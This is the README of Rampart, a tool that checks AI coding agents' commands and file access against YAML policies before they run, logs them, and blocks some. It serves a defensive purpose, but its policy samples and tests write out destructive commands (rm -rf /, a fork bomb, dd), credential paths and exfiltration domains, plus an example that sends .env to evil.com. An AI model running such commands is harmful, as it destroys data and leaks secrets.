<div align="center">

# 🛡️ Rampart

**See everything your AI agent does. Block the dangerous stuff.**

[](https://go.dev)
[](LICENSE)
[](https://github.com/peg/rampart/actions/workflows/ci.yml)
[](https://github.com/peg/rampart/releases)
[](https://docs.rampart.sh)

</div>

---

Running Claude Code in yolo mode? Letting agents manage your infrastructure unsupervised? Rampart gives you visibility and control — every tool call gets evaluated against your policy before it executes. Dangerous commands get blocked in microseconds. Everything gets logged to a hash-chained audit trail.

## How It Works

```mermaid
graph LR
    subgraph "AI Agents"
        direction TB
        CC[Claude Code] & CL[Cline] --> H[Native Hooks]
        OC[OpenClaw] --> S[Shell Shim]
        CX[Codex] --> P[LD_PRELOAD]
        O[Others] --> M[MCP Proxy]
    end

    H & S & P & M --> PE[YAML Policy Eval<br/>~20μs · every decision logged]

    PE --> PASS[✅ Execute]
    PE --> BLOCK[❌ Blocked]
    PE --> APR[👤 Approval]

    PE --> AU[📋 Hash-Chained Audit<br/>Syslog · CEF · Webhooks]

    PE -. "ambiguous ⚠️" .-> SB["⚡ rampart-verify<br/>(optional sidecar)<br/>gpt-4o-mini · Haiku · Ollama"]
    SB -. allow/deny .-> PE

    style PE fill:#238636,stroke:#fff,color:#fff
    style BLOCK fill:#da3633,stroke:#fff,color:#fff
    style APR fill:#d29922,stroke:#fff,color:#fff
    style PASS fill:#238636,stroke:#fff,color:#fff
    style AU fill:#1f6feb,stroke:#fff,color:#fff
    style SB fill:#2d333b,stroke:#f0883e,stroke-width:2px,stroke-dasharray: 5 5
```



*Pattern matching handles 95%+ of decisions in microseconds. The optional [rampart-verify](https://github.com/peg/rampart-verify) sidecar adds LLM-based classification for ambiguous commands. All decisions are written to a hash-chained audit trail.*

| Agent | Setup | Integration |
|-------|-------|-------------|
| **Claude Code** | `rampart setup claude-code` | Native `PreToolUse` hooks — works in `--dangerously-skip-permissions` mode |
| **OpenClaw** | `rampart setup openclaw` | Shell shim with human-in-the-loop approval flow. Add `--patch-tools` for file read/write coverage |
| **Cline** | `rampart setup cline` | Native hooks via settings |
| **Cursor** | `rampart setup cursor` | MCP proxy configuration |
| **Any agent** | `rampart wrap -- <agent>` | Shell wrapping via `$SHELL` |
| **MCP servers** | `rampart mcp -- <server>` | MCP protocol proxy |
| **System-wide** | `rampart preload -- <cmd>` | LD_PRELOAD syscall interception |

<div align="center">

</div>

## Contents

- [How It Works](#how-it-works)
- [Install](#install)
- [Claude Code Integration](#claude-code-integration)
- [Wrap Any Agent](#wrap-any-agent)
- [Protect Any Process (LD_PRELOAD)](#protect-any-process-ld_preload)
- [Protect MCP Servers](#protect-mcp-servers)
- [Quick Start](#quick-start)
- [Writing Policies](#writing-policies)
- [Approval Flow](#approval-flow)
- [Preflight API](#preflight-api)
- [Audit Trail](#audit-trail)
- [Live Dashboard](#live-dashboard)
- [Webhook Notifications](#webhook-notifications)
- [SIEM Integration](#siem-integration)
- [Webhook Actions](#webhook-actions)
- [Integration](#integration)
- [Performance](#performance)
- [Security Recommendations](#security-recommendations)
- [CLI Reference](#cli-reference)
- [Compatibility](#compatibility)
- [Building from Source](#building-from-source)
- [Contributing](#contributing)
- [Roadmap](#roadmap)
- [License](#license)

---

## Install

```bash
# Homebrew (macOS and Linux)
brew tap peg/rampart && brew install rampart

# Go install (requires Go 1.24+)
go install github.com/peg/rampart/cmd/rampart@latest

# Or download a binary from GitHub Releases
# https://github.com/peg/rampart/releases
```

> **Note:** Make sure `rampart` is in your PATH. For `go install`, add `$(go env GOPATH)/bin` to your shell profile, or symlink: `sudo ln -sf $(go env GOPATH)/bin/rampart /usr/local/bin/rampart`

---

## Claude Code Integration

Native integration through Claude Code's hook system. One command, no wrapper needed:

```bash
rampart setup claude-code
```

That's it. Every Bash command, file read, and file write goes through Rampart's policy engine before execution. Blocked commands never run.

Then just use Claude Code normally:
```bash
claude
```

Rampart evaluates every tool call in microseconds. Safe commands pass through transparently. Dangerous commands get blocked before the agent can execute them.

See what's happening in real time:
```bash
rampart watch
```

## Wrap Any Agent

For agents without a hook system, `wrap` sets `$SHELL` to a policy-checking shim. Works with any agent that reads the `$SHELL` environment variable (Aider, OpenCode, Continue, Cline, and more):

```bash
rampart wrap -- aider
rampart wrap -- opencode
rampart wrap -- python my_agent.py
```

## Protect Any Process (LD_PRELOAD)

For agents with no hook system and no `$SHELL` support, `preload` intercepts exec-family syscalls at the OS level. This is the universal fallback — it works with **any** dynamically-linked process:

```bash
# Protect Codex CLI (no hooks, no $SHELL — preload is the only way)
rampart preload -- codex

# Protect any Python agent
rampart preload -- python my_agent.py

# Protect any Node.js agent
rampart preload -- node agent.js

# Monitor mode (log only, don't block)
rampart preload --mode monitor -- risky-tool
```

Preload intercepts `execve`, `execvp`, `system()`, `popen()`, and `posix_spawn()` — every way a process can spawn a command. Each call gets evaluated against your policy before executing. Denied calls return `EPERM`.

**Requires:** `librampart.so` (Linux) or `librampart.dylib` (macOS) installed to `~/.rampart/lib/`. Build from `preload/` or download from releases.

**Platform notes:**
- **Linux:** Works with all dynamically-linked binaries (~95% coverage)
- **macOS:** Works with Homebrew, nvm, pyenv, cargo binaries. Blocked by SIP for `/usr/bin/*` (but AI agents don't live there)

See [`preload/README.md`](preload/README.md) for build instructions and details.

---

## Protect MCP Servers

Drop-in proxy between your agent and any MCP server. Evaluates every `tools/call` against your policies:

```bash
# Instead of connecting directly to an MCP server:
rampart mcp -- npx @modelcontextprotocol/server-filesystem /path
```

In your MCP config (Claude Code, Cursor, etc.):
```json
{
  "mcpServers": {
    "filesystem": {
      "command": "rampart",
      "args": ["mcp", "--", "npx", "@modelcontextprotocol/server-filesystem", "."]
    }
  }
}
```

Denied tool calls return a JSON-RPC error — the MCP server never sees them. Safe calls pass through transparently. Tools with destructive keywords (delete, destroy, remove) are blocked out of the box.

### Auto-Generate Policies from MCP Servers

Don't write policies from scratch — scan an MCP server's tool list and generate a deny-by-default policy:

```bash
rampart mcp scan -- npx @modelcontextprotocol/server-filesystem .
```

Review, customize, deploy. Each tool becomes an explicit rule you can allow or deny.

```bash
# Dry run — log everything, block nothing
rampart wrap --mode monitor -- your-agent

# Custom policy file
rampart wrap --config my-policy.yaml -- your-agent
```

---

## Quick Start

```bash
# Set up Claude Code integration (one command)
rampart setup claude-code

# Or wrap any agent
rampart wrap -- aider

# Or start the HTTP proxy
rampart serve

# Test the policy engine directly
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | rampart hook
# → {"hookSpecificOutput":{"permissionDecision":"deny","permissionDecisionReason":"Rampart: Destructive command blocked"}}
```

Three built-in profiles:

| Profile | Default | Use case |
|---------|---------|----------|
| `standard` | allow | Block dangerous, log suspicious, allow the rest |
| `paranoid` | deny | Explicit allowlist for everything |
| `yolo` | allow | Log-only, no blocking |

---

## Writing Policies

Policies are YAML. Glob matching, hot-reload on file change.

```yaml
version: "1"
default_action: allow

policies:
  - name: block-destructive
    match:
      tool: ["exec"]
    rules:
      - action: deny
        when:
          command_matches: ["rm -rf *", "mkfs.*", "dd if=*", ":(){ :|:& };:"]
        message: "Destructive command blocked"

  - name: block-credential-reads
    priority: 1
    match:
      tool: ["read"]
    rules:
      - action: deny
        when:
          path_matches: ["**/.ssh/id_*", "**/.aws/credentials", "**/.env"]
        message: "Credential access blocked"

  - name: block-exfil
    match:
      tool: ["fetch"]
    rules:
      - action: deny
        when:
          domain_matches: ["*.ngrok-free.app", "*.requestbin.com", "webhook.site"]
        message: "Exfiltration domain blocked"
```

**Evaluation:** Deny always wins. Lower priority number = evaluated first. Four actions: `deny`, `require_approval`, `log`, `allow`.

---

## Approval Flow

For the grey area — commands that need a human to decide:

```yaml
policies:
  - name: production-deploys
    match:
      tool: ["exec"]
    rules:
      - action: require_approval
        when:
          command_matches: ["kubectl apply *", "terraform apply *"]
        message: "Production deployment requires approval"
```

How approval reaches you depends on your environment:

```mermaid
graph LR
    PE[Policy Engine] -->|require_approval| D{Environment}
    D -->|Claude Code| CC["Native prompt<br/>(ask hook)"]
    D -->|MCP Client| MCP["Block & wait<br/>(proxy holds request)"]
    D -->|OpenClaw| OC["Chat message<br/>(approve in-chat)"]
    D -->|Webhook| WH["Signed URL<br/>(click to approve)"]
    D -->|CLI / API| CLI["rampart approve &lt;id&gt;"]

    CC -->|user responds| R[✅ Resolved]
    MCP -->|via API / dashboard| R
    OC -->|via API| R
    WH -->|HMAC-verified link| R
    CLI -->|direct| R

    style D fill:#d29922,stroke:#fff,color:#fff
    style R fill:#238636,stroke:#fff,color:#fff
```



```bash
rampart pending                          # What's waiting
rampart approve abc123                   # Let it through
rampart deny abc123 --reason "not now"   # Block it
```

---

## Preflight API

Check if a call would be allowed without executing it:

```bash
curl -s localhost:9090/v1/preflight/exec \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"agent":"a","session":"s","params":{"command":"rm -rf /"}}'
# → {"allowed":false,"decision":"deny","matched_policies":["block-destructive"]}
```

No side effects. For agents that plan before acting.

---

## Audit Trail

Every tool call is logged to hash-chained JSONL. Each entry includes a SHA-256 hash of the previous entry — tamper with any record and the chain breaks.

```bash
rampart audit tail --follow     # Stream events
rampart audit verify            # Check chain integrity
rampart audit stats             # Decision breakdown
rampart audit search            # Query by tool, agent, decision, time range
```

Why hash-chained: in regulated environments, you need to prove what your agent did. A hash chain means no one can edit history without detection.

---

## Live Dashboard

```bash
rampart watch
```

```
╔══════════════════════════════════════════════════════════════╗
║  RAMPART — enforce — 3 policies                             ║
╠══════════════════════════════════════════════════════════════╣
║  ✅ 21:03:42 exec  "git push origin main"     [allow-git]   ║
║  ✅ 21:03:41 read  ~/project/src/main.go      [default]     ║
║  🔴 21:03:38 exec  "rm -rf /tmp/*"            [protect-sys] ║
║  ✅ 21:03:35 exec  "npm test"                 [allow-dev]   ║
║  🟡 21:03:33 exec  "curl https://api.io"      [log-http]    ║
╠══════════════════════════════════════════════════════════════╣
║  1,247 total │ 1,201 allow │ 12 deny │ 34 log               ║
╚══════════════════════════════════════════════════════════════╝
```

---

## Webhook Notifications

Get real-time alerts when Rampart blocks something. Add a `notify` section to your policy file:

```yaml
version: "1"
default_action: allow

notify:
  url: "https://discord.com/api/webhooks/your/webhook"
  # Or Slack: "https://hooks.slack.com/services/your/webhook"
  on: ["deny"]  # Only notify on denied commands (options: deny, log)

policies:
  # ... your policies
```

Rampart sends a JSON payload to your webhook URL whenever a matching event occurs:

```json
{
  "timestamp": "2026-02-11T21:03:38Z",
  "decision": "deny",
  "tool": "exec",
  "command": "rm -rf /tmp/*",
  "policy": "protect-sys",
  "message": "Destructive command blocked",
  "agent": "claude-code",
  "session": "abc123"
}
```

Works with Discord webhooks, Slack incoming webhooks, or any HTTP endpoint that accepts POST requests.

---

## SIEM Integration

Send audit events to your existing security stack. Three output formats, works with any SIEM:

```bash
# RFC 5424 syslog (Wazuh, QRadar, ArcSight, LogRhythm, Sentinel)
rampart serve --syslog localhost:514

# Common Event Format (Splunk, QRadar, ArcSight, Exabeam)
rampart serve --syslog localhost:514 --cef

# CEF to file (when you don't have a syslog collector)
rampart serve --cef
```

All three outputs run alongside the default JSONL audit trail — you don't lose anything by enabling SIEM output.

**Wazuh users**: See [`docs/guides/wazuh-integration.md`](docs/guides/wazuh-integration.md) for a complete setup guide with custom decoder, alerting rules, and FIM recommendations for AI agent hosts.

---

## Webhook Actions

Delegate allow/deny decisions to an external service — LLM-based intent verification, Slack approval bots, custom logic:

```yaml
rules:
  - action: webhook
    when:
      command_matches: ['*production*']
    webhook:
      url: 'http://localhost:8090/verify'
      timeout: 5s
      fail_open: true
```

The webhook receives the full tool call context and returns `{"decision": "allow"}` or `{"decision": "deny", "reason": "..."}`. Fail-open by default so a down webhook doesn't break your agent.

**Reference implementation**: See [`rampart-verify`](https://github.com/peg/rampart-verify) — an optional sidecar that uses LLMs (gpt-4o-mini, Claude Haiku, or local Ollama) to classify ambiguous commands. Pattern matching handles 95% of decisions for free; the sidecar reviews the rest at ~$0.0001/call.

---

## Integration

### HTTP Proxy

Anything that can make HTTP requests works with Rampart. Point your agent's tool calls at the proxy:

| Method | Endpoint | Purpose |
|--------|----------|---------|
| `POST` | `/v1/tool/{toolName}` | Evaluate and execute |
| `POST` | `/v1/preflight/{toolName}` | Dry-run check |
| `GET` | `/v1/approvals` | Pending approvals |
| `POST` | `/v1/approvals/{id}/resolve` | Approve or deny |
| `GET` | `/healthz` | Health check |

### Framework Examples

```python
# Python (LangChain, CrewAI, any framework)
response = requests.post("http://localhost:9090/v1/tool/exec",
    headers={"Authorization": f"Bearer {token}"},
    json={"agent": "my-agent", "session": "s1", "params": {"command": cmd}})

if response.json()["decision"] == "deny":
    return f"Blocked: {response.json()['message']}"
```

### OpenClaw

For [OpenClaw](https://github.com/openclaw/openclaw) users — one command sets up a shell shim and background service:

```bash
rampart setup openclaw
```

This covers all `exec` tool calls. For full file tool coverage (Read, Write, Edit), run:

```bash
rampart setup openclaw --patch-tools
```

This patches OpenClaw's Read, Write, Edit, and Grep tools to check Rampart before file operations. Requires write access to the OpenClaw installation directory (typically needs `sudo` for global npm installs).

Supports OpenClaw `2026.1.30` – `2026.2.12` (latest).

⚠️ **Re-run after OpenClaw upgrades** — the patch modifies files in `node_modules` that get replaced on update. Between upgrade and re-patch, file tools bypass Rampart (exec shim remains active).

Works on Linux (systemd) and macOS (launchd).

---

## Performance

Policy evaluation in single-digit microseconds:

| Command | Decision | Time |
|---------|----------|------|
| `rm -rf /` | deny | 8µs |
| `sudo reboot` | log | 6µs |
| `.ssh/id_rsa` read | deny | 3µs |
| `git status` | allow | 4µs |
| `curl ngrok.io` | deny | 3µs |

The proxy adds negligible latency. Agents wait seconds for LLM responses — a few microseconds of policy evaluation is invisible.

---

## Security Recommendations

**Don't run your AI agent as root.** If the agent runs as root, no user separation can protect policy files or audit logs — root can read everything. Run your agent framework (OpenClaw, Claude Code, etc.) as an unprivileged user.

**Run `rampart serve` as a separate user.** If Rampart runs as the same user as your AI agent, the agent can read audit logs and modify policy files. A dedicated `rampart` user prevents this:

```bash
# Create a service account
sudo useradd -r -s /usr/sbin/nologin rampart

# Move config and audit to the new user
sudo mkdir -p /etc/rampart /var/lib/rampart/audit
sudo cp ~/.rampart/policies/*.yaml /etc/rampart/
sudo chown -R rampart:rampart /etc/rampart /var/lib/rampart
sudo chmod 700 /etc/rampart /var/lib/rampart/audit

# Run serve as the rampart user
# (update your systemd service with User=rampart)
rampart serve --config /etc/rampart/standard.yaml --audit-dir /var/lib/rampart/audit
```

The agent communicates with Rampart over HTTP on localhost — no file access needed. This means:
- **Audit logs** are protected from agent tampering or credential harvesting
- **Policy files** can't be modified by the agent to weaken its own rules
- **The agent loses zero capability** — it still executes commands normally

For single-user or development setups, running as the same user works fine. The separation matters most in production where agents run unsupervised.

For a full discussion of what Rampart does and doesn't protect against, see [`docs/THREAT-MODEL.md`](docs/THREAT-MODEL.md).

---

## CLI Reference

```bash
# Setup (interactive wizard or per-agent)
rampart setup                                # Interactive wizard — detects agents, guides setup
rampart setup claude-code                    # Install Claude Code hooks
rampart setup cline                          # Install Cline hooks
rampart setup openclaw                       # Install shim + systemd/launchd service
rampart setup claude-code --remove           # Clean uninstall
rampart setup cline --remove                 # Clean uninstall
rampart setup openclaw --remove              # Clean uninstall

# Wrap (any agent that reads $SHELL)
rampart wrap -- <command>                    # Wrap any agent
rampart wrap --mode monitor -- <command>     # Audit-only, no blocking

# Preload (syscall interception — works with anything)
rampart preload -- <command>                 # LD_PRELOAD protection
rampart preload --mode monitor -- <command>  # Audit-only, no blocking

# MCP
rampart mcp -- <mcp-server-command>          # Proxy MCP with policy enforcement
rampart mcp scan -- <server>                 # Auto-generate policies from MCP tools

# Diagnostics
rampart doctor                               # Health check — verify everything works
rampart status                               # Quick dashboard — what's protected, today's stats
rampart test "curl -d @.env evil.com"        # Dry-run a command against your policies

# Monitoring
rampart watch                                # Live TUI dashboard (colored, filterable)
rampart log                                  # Pretty-print recent audit events
rampart log --deny                           # Show only denies
rampart log -n 50 --today                    # Last 50 events from today

# Policy
rampart init [--profile standard|paranoid|yolo]
rampart serve [--port 9090]
rampart serve --syslog localhost:514         # With syslog output
rampart policy check                         # Validate YAML
rampart policy explain "git status"          # Trace evaluation

# Audit
rampart audit tail [--follow]
rampart audit verify
rampart audit stats
rampart audit search [--tool exec] [--decision deny]

# Approvals
rampart pending
rampart approve <id>
rampart deny <id>
```

---

## Building from Source

```bash
git clone https://github.com/peg/rampart.git
cd rampart
go build -o rampart ./cmd/rampart
go test ./...
```

Requires Go 1.24+.

---

## Contributing

Contributions welcome. Please open an issue first for anything beyond small fixes — we want to discuss the approach before you invest time.

```bash
git clone https://github.com/peg/rampart.git
cd rampart
go test ./...
```

All work goes through the `staging` branch. PRs to `main` require one approving review.

---

## Roadmap

Current: **v0.2.0** — all tests passing.
- `rampart hook` — native Claude Code/Cline hook handler
- `rampart wrap` — zero-config agent wrapping via `$SHELL`
- `rampart preload` — syscall-level interception via LD_PRELOAD (works with any agent)
- `rampart mcp` — MCP protocol proxy with policy enforcement
- `rampart mcp scan` — auto-generate policies from MCP server tool lists
- `action: webhook` — delegate decisions to external HTTP endpoints
- SIEM integration — `--syslog` (RFC 5424), `--cef` (Common Event Format)
- Python SDK (`sdks/python/`) — decorators, async support
- Four interceptors (exec, read, write, fetch)
- Response-side evaluation (catch credential leaks in output)
- Hash-chained audit trail with verification
- Human approval flow
- Live terminal dashboard
- Webhook notifications (Slack, Discord, Teams, generic)
- HTML audit reports
- OpenClaw daemon integration
- Three security profiles (standard, paranoid, yolo)

## Compatibility

| Agent | Method | Status |
|-------|--------|--------|
| Claude Code | `rampart setup claude-code` | Native hooks (exec + file), all platforms |
| Cline | `rampart setup cline` | Native hooks (exec + file), all platforms |
| OpenClaw | `rampart setup openclaw [--patch-tools]` | Exec shim + optional file tool patch, Linux/macOS |
| Codex CLI | `rampart preload` | LD_PRELOAD, Linux + macOS |
| Claude Desktop | `rampart mcp` | MCP server proxying, all platforms |
| Aider | `rampart wrap` | Linux, macOS |
| OpenCode | `rampart wrap` | Linux, macOS |
| Continue | `rampart wrap` | Linux, macOS |
| Cursor | `rampart wrap` + `rampart mcp` | Linux, macOS |
| Windsurf | `rampart wrap` | Linux, macOS |
| Python agents | `rampart preload` or HTTP API | Linux, macOS |
| Node.js agents | `rampart preload` or HTTP API | Linux, macOS |
| Any MCP server | `rampart mcp` | All platforms |
| Any process | `rampart preload` | Linux, macOS |
| Custom agents | `rampart serve` | All platforms |

`rampart hook`, `rampart mcp`, `rampart mcp scan`, and `rampart serve` work on Linux, macOS, and Windows.
`rampart wrap` and `rampart preload` require Linux or macOS.
`--syslog` requires Linux or macOS. `--cef` works on all platforms.

See [`docs/ROADMAP.md`](docs/ROADMAP.md) for what's coming next. Priorities shift based on feedback — [open an issue](https://github.com/peg/rampart/issues) if something matters to you.

---

## License

[Apache 2.0](LICENSE)
